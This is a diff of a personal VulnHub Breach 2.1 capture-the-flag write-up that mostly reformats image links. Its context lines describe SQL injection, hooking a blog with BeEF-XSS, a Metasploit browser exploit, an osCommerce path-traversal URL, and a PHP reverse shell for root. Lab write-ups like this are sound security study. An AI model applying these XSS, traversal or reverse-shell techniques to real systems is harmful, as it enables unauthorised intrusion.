@@ -296,14 +296,14 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ## Browser Access
 - /index.html
-![[Pasted image 20210426185912.png]]
+![](Pasted%20image%2020210426185912.png)
 - /blog
-![[Pasted image 20210427154924.png]]
+![](Pasted%20image%2020210427154924.png)
 - seems can register new account.
 - by playing with it, there's a username should be admin
-![[Pasted image 20210427155110.png]]
+![](Pasted%20image%2020210427155110.png)
 - Seems like we have SQLi?
-![[Pasted image 20210427155249.png]]
+![](Pasted%20image%2020210427155249.png)
 - And YES! SQLi confirmed
 ```bash
 ┌──(htb㉿kali)-[~/Writeups/VulnHub/Breach-2_final2.1]
@@ -327,10 +327,10 @@ available databases [5]:
 ```
 
 - The login and register link is gone after I register one account, and the link Members finally got one record
-![[Pasted image 20210427160005.png]]
+![](Pasted%20image%2020210427160005.png)
 - So maybe the only diving entry is from SQLi?
 - The DB oscommerce told us there's another online store system running
-![[Pasted image 20210427160407.png]]
+![](Pasted%20image%2020210427160407.png)
 
 # mysql injection
 - from [[10 - Web Service]] we confirmed SQLi
@@ -696,7 +696,7 @@ Table: user
 ## Beef-XSS
 - OK, since SQLi actually not lead to anything, and if we go search the `blogphp`, we will see some XSS exploit.
 - And then I recall that we did have a tool called Beef-XSS from kali, and even more, from web page index.html, we did have a big image says beef....It's now all connected.
-![[Pasted image 20210429102700.png]]
+![](Pasted%20image%2020210429102700.png)
 - This is the time to learn how to use Beef-XSS
 - Start Beef-XSS, it will show us the hook link along with the web-ui link:
 	- hook link: http://127.0.0.1:3000/hook.js
@@ -742,11 +742,11 @@ Hint: Some lines were ellipsized, use -l to show in full.
 
 - After login, we will see offline/online browser folder, but everything is empty, this is because we haven't put the hook into our target website.
 - Since we do have blogphp register page, we can use it to put the hook.
-![[Pasted image 20210429122955.png]]
+![](Pasted%20image%2020210429122955.png)
 - Then after we click members, this script would show and execute in this page
-![[Pasted image 20210429123043.png]].
+![](Pasted%20image%2020210429123043.png)
 - Which will hook this blogphp to our beef-xss
-![[Pasted image 20210429123254.png]]
+![](Pasted%20image%2020210429123254.png)
 - Then we create an invisible iFrame to execute our payload, it's actually a lot like RFI.
 ```bash
 ┌──(htb㉿kali)-[/etc/beef-xss]
@@ -811,9 +811,9 @@ exit, quit            Exit the JS shell
 - If we are going to use the msf exploit, there has to be a very old version of firefox, v15. But interesting thing is, I'm the one using firefox to access the webpage right now, does it affect the exploit?
 - But after I put in hook, Beef-XSS will get two online browsers, one is with ip address of kali, one is with ip address of Breach2.1
 - The one with kali shows that web browser version is 78.0
-![[Pasted image 20210506164237.png]]
+![](Pasted%20image%2020210506164237.png)
 - The one with Breach2.1 shows that web browser version is 15
-![[Pasted image 20210506164328.png]]
+![](Pasted%20image%2020210506164328.png)
 
 - OK, we are finally get on to the system by msf, so we will have to use the hook from ip address of Breach2.1, which FF version is 15 can trigger by this exploit.
 ```bash
@@ -1018,7 +1018,7 @@ localhost [127.0.0.1] 2323 (initech) open
 ```
 
 - We have some weird coordinates. And Google Maps says it is a place in Houston city called “Houston Police Memorial”.
-![[Pasted image 20210506174456.png]]
+![](Pasted%20image%2020210506174456.png)
 
 - OK, new trick to learn, netcat is not all powerful, since there's some weird code from the output, we should always try other tools like telnet.
 ```bash
@@ -1175,10 +1175,10 @@ tcp        0      0 127.0.0.1:57977         127.0.0.1:2323          ESTABLISHED
 ```
 
 - Port 8888 seems new.
-![[Pasted image 20210506182319.png]]
+![](Pasted%20image%2020210506182319.png)
 - Now we finally have the oscommerce come to us. There's an exploit existing from our previous investigation.
-![[Pasted image 20210506182550.png]]
-![[Pasted image 20210506183001.png]]
+![](Pasted%20image%2020210506182550.png)
+![](Pasted%20image%2020210506183001.png)
 - It says the exploit should be like this:
 ````html
 http://www.example.com/admin/includes/applications/services/pages/uninstall.php?module=../../../../../../../../cmd
@@ -1188,13 +1188,13 @@ http://www.example.com/admin/includes/applications/services/pages/uninstall.php?
 milton@breach2:~$ echo "<?php phpinfo() ?>" > /tmp/hello.php
 ```
 - Then we can see this page from web browser
-![[Pasted image 20210506184216.png]]
+![](Pasted%20image%2020210506184216.png)
 - The link part can only be `hello` but not `hello.php`.
 - Since the nginx is run by sudo, and `ps aux` along with this `/etc/init.d/nginx` file permission showed me that it owns by root, so I'm expecting that my php reverse shell get me to user root.
 ```bash
 ...[download & modify php revese shell]...
 ```
-![[Pasted image 20210506184900.png]]
+![](Pasted%20image%2020210506184900.png)
 ```bash
 ┌──(htb㉿kali)-[~]
 └─$ bash
@@ -1247,7 +1247,7 @@ User blumbergh may run the following commands on breach2:
 blumbergh@breach2:/home/bill$ crontab -l
 no crontab for blumbergh
 ```
-![[Pasted image 20210506185522.png]]
+![](Pasted%20image%2020210506185522.png)
 
 - This is working, but we need to modify the command.
 ```bash
